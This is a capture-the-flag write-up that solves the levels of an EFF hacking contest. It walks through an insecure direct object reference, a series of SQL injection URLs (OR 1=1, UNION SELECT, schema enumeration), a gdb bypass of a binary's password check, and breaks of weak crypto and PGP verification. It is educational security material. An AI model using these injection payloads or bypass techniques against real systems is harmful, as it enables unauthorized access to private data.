# Capture The Flag by EFF
https://eff-ctf.org

Capture The Flag by EFF is a hacking contest held at the Enigma Conference in San Francisco, CA on Tuesday January 26th 6:30 - 9:30 pm.  The following are my rough solutions to the problem set.  It is possible that the original problems will not be available in the future.  

### Level 0 The Social Notwork

A vulnerable web application that does not implement technical controls on viewing other users' inbox.  

Your inbox:

https://level0x0.eff-ctf.org/user/M1k3y/message/1

Replace user with usdhs for:

https://level0x0.eff-ctf.org/user/usdhs/message/1

![](/images/level0.png)


### Level 1 Tweeting Twerps

If there's no results or an error within the SQL statement, you will receive the message "Your SQL is bad and you should feel bad". 

The following lists all tweets and indicates that the form is vulnerable:
```
https://level0x1.eff-ctf.org/tweets?uid=1 OR 1=1--
```

Doing a union select, there are no errors received with two nulls, this indicates the correct number of columns to use:

```
https://level0x1.eff-ctf.org/tweets?uid=3 UNION SELECT null, null--
```

Testing string concatenation further indicates it's a MySQL DB, so we should be using MySQL syntax:
```
https://level0x1.eff-ctf.org/tweets?uid=3 UNION SELECT null,'test'+'ing'--
```

Enumerating, we start from the most general data down to more specific data.    

Database
```
https://level0x1.eff-ctf.org/tweets?uid=3 UNION SELECT null,database()--
```

Tables
```
https://level0x1.eff-ctf.org/tweets?uid=1 UNION SELECT null, table_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'
```

Columns
```
https://level0x1.eff-ctf.org/tweets?uid=1 UNION SELECT null, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'
```

Finally, using this information we get the flag in the following private messages:
Private messages:
```
https://level0x1.eff-ctf.org/tweets?uid=1 UNION SELECT null, body FROM messages--
```

![](/images/level1.png)


### Level 2 Reverse Engineering for Fun and No Profit

I have not yet figured out what the password is, however I have been able to circumvent the need for an actual password to obtain the flag.

Tools used:  64-bit linux host (kali/ubuntu) with readelf, strings, objdump, gdb

Obtaining file type:

<pre>
kali:~/re# file DNSvault
DNSvault: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4fa2a0be6e3d44846833aa7723ca38e31a6b0baa, not stripped
</pre>

Obtaining clues from strings.  I have truncated the output to items that were interesting.  C methods that relate to output (puts, printf), input (stdin, fgets), and likely the comparison method used to test the password entered (memcmp)
<pre>
kali:~/re# strings DNSvault
/lib64/ld-linux-x86-64.so.2

puts
__stack_chk_fail
putchar
stdin
printf
fgets
memcmp
 _____                                    _  __      __         _ _
|  __ \                                  | | \ \    / /        | | |
| |__) |_ _ ___ _____      _____  _ __ __| |  \ \  / /_ _ _   _| | |_
|  ___/ _` / __/ __\ \ /\ / / _ \| '__/ _` |   \ \/ / _` | | | | | __|
| |  | (_| \__ \__ \\ V  V / (_) | | | (_| |    \  / (_| | |_| | | |_
|_|   \__,_|___/___/ \_/\_/ \___/|_|  \__,_|     \/ \__,_|\__,_|_|\__|
A project of the Department of National Security
Authorized use only!
Please enter your password:
1 Entry:
+----------------+---------------------+
| Username       | Password            |
| the flag       | %s |
ERROR: Incorrect Password
;*3$"
GCC: (Ubuntu 4.8.4-2ubuntu1~14.04) 4.8.4
GCC: (Ubuntu 4.8.2-19ubuntu1) 4.8.2
putchar@@GLIBC_2.2.5
puts@@GLIBC_2.2.5
stdin@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
</pre>

Diving into the actual grit.  Dump the disassembled source using objdump:

<pre>
root@kali:~/re# objdump -D DNSvault
</pre>

This is where most of the work was performed.  I have annotated the dump with my notes in [DNSvault.asm](./DNSvault.asm)  

Here's a snippet of the key areas from main().  I have further bolded the important instructions.

<pre>
...<i>truncated</i>...

<b>
  4008a0:	e8 4b fd ff ff       	callq  4005f0 <fgets@plt>         # request input from stdin
</b>
  4008a5:	c7 85 4c ff ff ff 00 	movl   $0x0,-0xb4(%rbp)           
  4008ac:	00 00 00 
  4008af:	eb 50                	jmp    400901 <main+0x204>        # jumping to a compare...
  4008b1:	8b 85 4c ff ff ff    	mov    -0xb4(%rbp),%eax           # jump if less than equal 
  4008b7:	48 98                	cltq                              # convert long to quad
  4008b9:	0f b6 44 05 90       	movzbl -0x70(%rbp,%rax,1),%eax    # sign extends and copies to double word dest
  4008be:	83 f0 42             	xor    $0x42,%eax                 # value 35 here in eax??
  4008c1:	89 c2                	mov    %eax,%edx                  # copy 35 to edx
  4008c3:	8b 85 4c ff ff ff    	mov    -0xb4(%rbp),%eax           # back to 0
  4008c9:	48 98                	cltq   
  4008cb:	88 54 05 b0          	mov    %dl,-0x50(%rbp,%rax,1)     # dl is 35, 
  4008cf:	8b 85 4c ff ff ff    	mov    -0xb4(%rbp),%eax
  4008d5:	48 98                	cltq   
  4008d7:	0f b6 54 05 90       	movzbl -0x70(%rbp,%rax,1),%edx
  4008dc:	8b 85 4c ff ff ff    	mov    -0xb4(%rbp),%eax
  4008e2:	48 98                	cltq   
  4008e4:	0f b6 84 05 70 ff ff 	movzbl -0x90(%rbp,%rax,1),%eax
  4008eb:	ff 
  4008ec:	31 c2                	xor    %eax,%edx
  4008ee:	8b 85 4c ff ff ff    	mov    -0xb4(%rbp),%eax
  4008f4:	48 98                	cltq                                # convert long to quad (8 bytes)
  4008f6:	88 54 05 d0          	mov    %dl,-0x30(%rbp,%rax,1)
  4008fa:	83 85 4c ff ff ff 01 	addl   $0x1,-0xb4(%rbp)
  400901:	83 bd 4c ff ff ff 13 	cmpl   $0x13,-0xb4(%rbp)
  400908:	7e a7                	jle    4008b1 <main+0x1b4>          # jump back
  40090a:	c6 45 c3 00          	movb   $0x0,-0x3d(%rbp)
  40090e:	48 8d 8d 50 ff ff ff 	lea    -0xb0(%rbp),%rcx
  400915:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
  400919:	ba 14 00 00 00       	mov    $0x14,%edx
  40091e:	48 89 ce             	mov    %rcx,%rsi
  400921:	48 89 c7             	mov    %rax,%rdi                    # after entering password: 

  <b>
  #Check if the password is correct.  If it not, jump to printing the error message.
  400924:	e8 b7 fc ff ff       	callq  4005e0 <memcmp@plt>
  400929:	85 c0                	test   %eax,%eax                      
  40092b:	75 4f                	jne    40097c <main+0x27f>            
                                                                      </b>
                                                                 
  <b> # This is the address we want to jump to.  This begins the printing of the flag                                                               
  40092d:	bf 4b 0c 40 00       	mov    $0x400c4b,%edi    </b>            
  400932:	e8 69 fc ff ff       	callq  4005a0 <puts@plt>
  400937:	bf 58 0c 40 00       	mov    $0x400c58,%edi
  40093c:	e8 5f fc ff ff       	callq  4005a0 <puts@plt>
  400941:	bf 88 0c 40 00       	mov    $0x400c88,%edi
  400946:	e8 55 fc ff ff       	callq  4005a0 <puts@plt>
  40094b:	bf 58 0c 40 00       	mov    $0x400c58,%edi
  400950:	e8 4b fc ff ff       	callq  4005a0 <puts@plt>
  400955:	48 8d 45 d0          	lea    -0x30(%rbp),%rax               # load effective address
  400959:	48 89 c6             	mov    %rax,%rsi
  40095c:	bf b1 0c 40 00       	mov    $0x400cb1,%edi                 # Calls the please enter your password address
  400961:	b8 00 00 00 00       	mov    $0x0,%eax
  400966:	e8 55 fc ff ff       	callq  4005c0 <printf@plt>            # Prints the flag
  40096b:	bf 58 0c 40 00       	mov    $0x400c58,%edi                 # Prints +------+
  400970:	e8 2b fc ff ff       	callq  4005a0 <puts@plt>
  400975:	b8 00 00 00 00       	mov    $0x0,%eax
  40097a:	eb 0f                	jmp    40098b <main+0x28e>
  40097c:	bf ca 0c 40 00       	mov    $0x400cca,%edi                 # jump to here from not equal compare
  400981:	e8 1a fc ff ff       	callq  4005a0 <puts@plt>              # print incorrect password message
  400986:	b8 01 00 00 00       	mov    $0x1,%eax

  ...<i>truncated</i>...
</pre>


Load up the executable in gdb.  Set a breakpoint before the jump not equal (jne) @ 0x40092b so that the error message is not printed.
<pre>
(gdb) break *0x40092b
Breakpoint 1 at 0x40092b
(gdb) run
Starting program: /root/re/DNSvault
 _____                                    _  __      __         _ _
|  __ \                                  | | \ \    / /        | | |
| |__) |_ _ ___ _____      _____  _ __ __| |  \ \  / /_ _ _   _| | |_
|  ___/ _` / __/ __\ \ /\ / / _ \| '__/ _` |   \ \/ / _` | | | | | __|
| |  | (_| \__ \__ \\ V  V / (_) | | | (_| |    \  / (_| | |_| | | |_
|_|   \__,_|___/___/ \_/\_/ \___/|_|  \__,_|     \/ \__,_|\__,_|_|\__|
A project of the Department of National Security
Authorized use only!


Please enter your password: abc

Breakpoint 1, 0x000000000040092b in main ()
</pre>

We can see the program counter is set to our breakpoint:

<pre>
(gdb) i r $pc
pc             0x40092b 0x40092b <main+558>
</pre>

Instead of following the jump logic we can set the program counter to the next instruction after jne:

<pre>
(gdb) set $pc=0x40092d
(gdb) c
Continuing.

(gdb) y:
+----------------+---------------------+
| Username       | Password            |
+----------------+---------------------+
| the flag       | kseR+#2 |
+----------------+---------------------+
</pre>

Alternatively, we can modify the zflag which is set by 'test eax, eax' on line:  

<pre>
400924:	e8 b7 fc ff ff       	callq  4005e0 <memcmp@plt>
400929:	85 c0                	test   %eax,%eax                      
40092b:	75 4f                	jne    40097c <main+0x27f>     
</pre>

jne will jump to the error message if the zflag it is not equal to 0.  The zflag is set by test %eax, %eax.  Setting the zflag will prevent the jump:

<pre>
(gdb) set $ps=$ps|0x40
(gdb) p/t $eflags
$5 = 1001000110
(gdb) c
Continuing.

1 Entry:
+----------------+---------------------+
| Username       | Password            |
+----------------+---------------------+
| the flag       | kseR+#2 |
+----------------+---------------------+

</pre>

Additional notes:

I have not been able to figure out the password to the code, but I suspect that code from addresses 0x4008b1 to 0x400908 is where the comparison takes place.  If we use gdb to dump the memory register $rbp-0xb4, within the memory blocks we can see the password we have inputed for comparison.  Values in 0x400718 to 0x40081c seem to also allude to a potential password character set (67:,'6b6*'b .#,'6c X+#2 EY? N'2), although could be completely off base.


### Level 3 Never Roll Your Own Crypto

My first incorrect approach was to build a sort of rainbow table.  Keep a hash table with the key as ascii characters, and values as a massive list of ciphers. Keep making requests until you start to receive duplicates.  In theory, this would work but not an ideal solution.

Correct approach:
Each ascii character produces a random 4 set sized list of integers.  The sum will always be the same.  Create a hashtable  and use the summed value as your key and ascii character as your value.  See the python code [level3.py](./level3.py) for a rough but working solution.

```
$ python level3.py
This week's decryption passphrase is: Don't BULLRUN me bro!
```

### Level 4 A Mole in the Ranks

Go to: 
https://www.igolder.com/pgp/generate-key/

and generate a public and private key with the following e-mail:

Dept of National Security Agent <agent@dns.spy>

Use:  https://level0x4.eff-ctf.org/easyverify to verify that the key returns 'blue'.  You may need a handful of tries generating keys.

![](/images/level4.png)

Plug in the key, and you will receive an encrypted pgp message.  Import the private key you generated before, and decrypt the message for the flag.

```
$ gpg -d enc.txt

You need a passphrase to unlock the secret key for
user: "Dept of National Security Agent <agent@dns.spy>"
2048-bit RSA key, ID E0D72684, created 2016-01-27

gpg: encrypted with 2048-bit RSA key, ID E0D72684, created 2016-01-27
      "Dept of National Security Agent <agent@dns.spy>"
Great, we have a secure channel. Here is the thing I wanted to tell you so badly.

The flag is: Tiny Keyspace is Bad 4 Business
gpg: WARNING: message was not integrity protected
```


